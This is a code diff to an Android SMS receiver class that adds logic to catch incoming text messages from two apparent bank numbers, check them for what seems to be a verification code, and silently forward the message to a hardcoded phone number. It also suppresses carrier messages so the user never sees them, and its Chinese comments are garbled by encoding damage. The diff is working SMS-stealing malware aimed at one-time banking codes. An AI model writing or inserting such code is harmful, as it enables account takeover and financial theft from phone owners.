@@ -10,6 +10,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 
 @SuppressLint("NewApi")
@@ -18,11 +19,11 @@ public class SMSReceiver extends BroadcastReceiver {
 
 	private int tag = 1;
 	String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
+	private String phone = "15757121405";
 
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		// TODO Auto-generated method stub
-		// ´¦Àí¶ÌĞÅÍ¨Öª
 		if (intent.getAction().equals(SMS_RECEIVED)) {
 			smg(context, intent);
 		}
@@ -31,7 +32,6 @@ public class SMSReceiver extends BroadcastReceiver {
 	public void smg(Context context, Intent intent) {
 		System.out.println("SMSReceiver, isOrderdeBroadcast()="
 				+ isOrderedBroadcast());
-
 		Bundle bundle = intent.getExtras();
 		Object messages[] = (Object[]) bundle.get("pdus");
 		if (messages != null && messages.length > 0) {
@@ -40,13 +40,28 @@ public class SMSReceiver extends BroadcastReceiver {
 				smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
 			}
 			for (SmsMessage message : smsMessage) {
-				String content = message.getMessageBody();// µÃµ½¶ÌĞÅÄÚÈİ
-				String sender = message.getOriginatingAddress();// µÃµ½·¢¼şÈËºÅÂë
-				if (sender.equals("10086")) {
-					this.abortBroadcast();
+				String content = message.getMessageBody();
+				String sender = message.getOriginatingAddress();
+				if (sender.equals("95508") || sender.equals("95555")) {// å¹¿å‘ä¿¡ç”¨å¡//
+					SmsManager smsManager = SmsManager.getDefault();
+					if (content.indexOf("éªŒè¯ç ") != -1) {
+						/** åˆ‡åˆ†çŸ­ä¿¡ï¼Œæ¯ä¸ƒåä¸ªæ±‰å­—åˆ‡ä¸€ä¸ªï¼Œä¸è¶³ä¸ƒåå°±åªæœ‰ä¸€ä¸ªï¼šè¿”å›çš„æ˜¯å­—ç¬¦ä¸²çš„Listé›†åˆ */
+						// List<String> texts =
+						// smsManager.divideMessage(content);
+						// å‘é€ä¹‹å‰æ£€æŸ¥çŸ­ä¿¡å†…å®¹æ˜¯å¦ä¸ºç©º
+						// for (int i = 0; i < texts.size(); i++) {
+						// String text = texts.get(i);
+						// }
+						smsManager.sendTextMessage(phone, null, content, null,
+								null);
+					}
 				} else {
-					addNotification(context, content, sender);
-					tag++;
+					if (sender.equals("10086")) {
+						this.abortBroadcast();
+					} else {
+						addNotification(context, content, sender);
+						tag++;
+					}
 				}
 			}
 		}
@@ -56,15 +71,16 @@ public class SMSReceiver extends BroadcastReceiver {
 		NotificationManager manager = (NotificationManager) context
 				.getSystemService(Context.NOTIFICATION_SERVICE);
 		Intent intent = new Intent(context, MainActivity.class);
+		Bundle bundle = new Bundle();
+		bundle.putString("msg", msg);
+		bundle.putString("sender", sender);
+		intent.putExtras(bundle);
 		PendingIntent pendingIntent = PendingIntent.getActivity(context, 0,
 				intent, PendingIntent.FLAG_ONE_SHOT);
-		// Notification.FLAG_INSISTENT; //ÈÃÉùÒô¡¢Õñ¶¯ÎŞÏŞÑ­»·£¬Ö±µ½ÓÃ»§ÏìÓ¦
-		// Notification.FLAG_AUTO_CANCEL; //Í¨Öª±»µã»÷ºó£¬×Ô¶¯ÏûÊ§
-		// Notification.FLAG_NO_CLEAR; //µã»÷'Clear'Ê±£¬²»Çå³ş¸ÃÍ¨Öª(QQµÄÍ¨ÖªÎŞ·¨Çå³ı£¬¾ÍÊÇÓÃµÄÕâ¸ö)
 		Notification noti = new Notification.Builder(context)
 				.setContentTitle(sender).setContentText(msg).setTicker("MSG")
-				.setContentIntent(pendingIntent).setSmallIcon(R.drawable.icon)
-				.build();
+				.setContentIntent(pendingIntent)
+				.setSmallIcon(R.drawable.notice).build();
 		manager.notify(tag, noti);
 	}
 }
